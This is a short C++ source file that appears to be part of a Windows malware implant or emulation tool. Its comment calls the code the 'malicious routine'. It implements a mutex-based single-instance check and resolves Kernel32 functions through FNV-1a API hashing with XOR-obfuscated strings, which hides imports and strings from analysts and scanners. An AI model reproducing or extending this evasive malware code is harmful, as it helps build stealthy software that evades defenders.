#include "gflagsui_util.hpp"

// Uses a global mutex to ensure that only one instance of the
// malicious routine is running.
// If create_mutex is false, the function only attempts to open the
// mutex to check for existence.
DWORD EnsureSingleton(LPCWSTR mutex_name, BOOL create_mutex) {
    if (create_mutex) {
        CreateMutexW_t fp_CreateMutexW = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), CreateMutexW);
        if (!fp_CreateMutexW) {
            return FAIL_GET_CREATE_MUTEXW;
        }

        HANDLE h_mutex = fp_CreateMutexW(NULL, false, mutex_name);
        if (h_mutex == NULL) {
            return GetLastError();
        } else if (GetLastError() == ERROR_ALREADY_EXISTS) {
            CloseHandle(h_mutex);
            return ERROR_ALREADY_EXISTS;
        } else {
            // Successfully created mutex
            return ERROR_SUCCESS;
        }
    } else {
        // Only check if it exists
        OpenMutexW_t fp_OpenMutexW = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), OpenMutexW);
        if (!fp_OpenMutexW) {
            return FAIL_GET_CREATE_MUTEXW;
        }

        HANDLE h_mutex = fp_OpenMutexW(SYNCHRONIZE, false, mutex_name);
        if (h_mutex == NULL) {
            DWORD error = GetLastError();
            // Only proceed if it doesn't already exist
            if (error != ERROR_FILE_NOT_FOUND) {
                return error;
            } else {
                return ERROR_SUCCESS;
            }
        } else {
            CloseHandle(h_mutex);
            return ERROR_ALREADY_EXISTS;
        }
    }
}
